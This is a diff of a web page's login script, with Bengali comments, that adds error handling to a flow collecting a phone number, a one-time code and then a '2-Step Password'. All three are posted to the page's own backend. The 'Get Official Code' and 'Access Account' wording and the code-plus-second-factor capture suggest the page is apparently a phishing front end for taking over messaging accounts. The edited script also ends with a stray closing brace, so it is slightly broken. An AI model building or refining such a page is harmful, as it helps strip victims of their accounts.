@@ -111,53 +111,60 @@
  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
 
     <script>
-    // এই ভেরিয়েবলগুলো সবার ওপরে থাকবে ডাটা ধরে রাখার জন্য
-    let finalPhone = "";
-    let finalOTP = ""; 
+    // ডাটা স্টোর করার জন্য একটি অবজেক্ট ব্যবহার করা ভালো
+let loginData = {
+    phone: "",
+    otp: ""
+};
 
-    const phoneInput = document.querySelector("#phone");
-    const iti = window.intlTelInput(phoneInput, {
-        initialCountry: "bd",
-        separateDialCode: true,
-        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js",
-    });
+const phoneInput = document.querySelector("#phone");
+const iti = window.intlTelInput(phoneInput, {
+    initialCountry: "bd",
+    separateDialCode: true,
+    utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js",
+});
 
-    // ধাপ ১: ওটিপি পাঠানো
-    async function sendOTP() {
-        finalPhone = iti.getNumber();
-        const btn = document.getElementById('btn-otp');
-        btn.innerText = "SENDING...";
-        
+// ধাপ ১: ওটিপি পাঠানো
+async function sendOTP() {
+    loginData.phone = iti.getNumber();
+    const btn = document.getElementById('btn-otp');
+    btn.innerText = "SENDING...";
+    
+    try {
         const res = await fetch('/api/send_otp', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: finalPhone })
+            body: JSON.stringify({ phone: loginData.phone })
         });
         const data = await res.json();
         if (data.success) {
             document.getElementById('step-1').classList.remove('active-step');
             document.getElementById('step-2').classList.add('active-step');
         } else {
-            alert(data.message);
+            alert("Error: " + data.message);
         }
-        btn.innerText = "Get Official Code";
+    } catch (err) {
+        alert("Server connection failed!");
     }
+    btn.innerText = "Get Official Code";
+}
 
-    // ধাপ ২: ওটিপি ভেরিফাই
-    async function verifyOTP() {
-        finalOTP = document.getElementById('otp-code').value; // এখানে ওটিপি সেভ হচ্ছে
-        const btn = document.getElementById('btn-verify');
-        
-        if (!finalOTP) return alert("Enter OTP!");
+// ধাপ ২: ওটিপি ভেরিফাই
+async function verifyOTP() {
+    const otpInput = document.getElementById('otp-code').value;
+    if (!otpInput) return alert("Enter OTP!");
+    
+    loginData.otp = otpInput; // এখানে ডাটা সেভ করে রাখা হচ্ছে
+    const btn = document.getElementById('btn-verify');
+    btn.innerText = "VERIFYING...";
 
-        btn.innerText = "VERIFYING...";
-
+    try {
         const res = await fetch('/api/verify_login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
-                phone: finalPhone, 
-                code: finalOTP 
+                phone: loginData.phone, 
+                code: loginData.otp 
             })
         });
         
@@ -165,32 +172,35 @@
 
         if (data.success) {
             window.location.href = "/dashboard";
-        } 
-        else if (data.message === "SHOW_PWD_STEP") {
+        } else if (data.message === "SHOW_PWD_STEP") {
             document.getElementById('step-2').classList.remove('active-step');
             document.getElementById('step-3').classList.add('active-step');
         } else {
             alert(data.message);
         }
-        btn.innerText = "Verify Code";
+    } catch (err) {
+        alert("Verification failed!");
     }
+    btn.innerText = "Verify Code";
+}
 
-    // ধাপ ৩: পাসওয়ার্ড সাবমিট (এই ফাংশনটি আপনার কোডে মিসিং ছিল)
-    async function verifyFinal() {
-        const pwd = document.getElementById('two-step-pass').value;
-        const btn = document.getElementById('btn-final');
-        
-        if (!pwd) return alert("Please enter your 2-Step Password!");
+// ধাপ ৩: ফাইনাল পাসওয়ার্ড সাবমিট
+async function verifyFinal() {
+    const pwd = document.getElementById('two-step-pass').value;
+    const btn = document.getElementById('btn-final');
+    
+    if (!pwd) return alert("Please enter your 2-Step Password!");
 
-        btn.innerText = "ACCESSING...";
-        btn.disabled = true;
+    btn.innerText = "ACCESSING...";
+    btn.disabled = true;
 
+    try {
         const res = await fetch('/api/verify_login', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
-                phone: finalPhone, 
-                code: finalOTP, // ওটিপি কোডটা পাসওয়ার্ডের সাথে আবার পাঠাতে হবে
+                phone: loginData.phone, 
+                code: loginData.otp, // আগের ধাপের ওটিপি পাঠানো হচ্ছে
                 password: pwd 
             })
         });
@@ -200,11 +210,15 @@
         if (data.success) {
             window.location.href = "/dashboard";
         } else {
-            alert(data.message);
+            alert("Wrong Password! " + data.message);
             btn.disabled = false;
             btn.innerText = "Access Account";
         }
+    } catch (err) {
+        alert("Final verification failed!");
+        btn.disabled = false;
     }
+                }
 </script>
 </body>
 </html>
